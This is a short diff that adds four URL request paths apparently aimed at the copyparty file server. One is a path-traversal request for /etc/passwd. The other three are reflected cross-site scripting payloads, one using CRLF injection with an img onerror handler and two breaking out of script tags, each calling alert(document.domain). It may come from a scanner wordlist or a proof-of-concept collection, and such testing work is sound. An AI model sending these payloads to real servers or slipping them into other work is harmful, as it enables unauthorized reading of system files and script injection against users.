@@ -1,0 +1,4 @@
+/.cpr/%2Fetc%2Fpasswd
+/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(document.domain)%3E
+/?ru&filter=%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/?hc=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
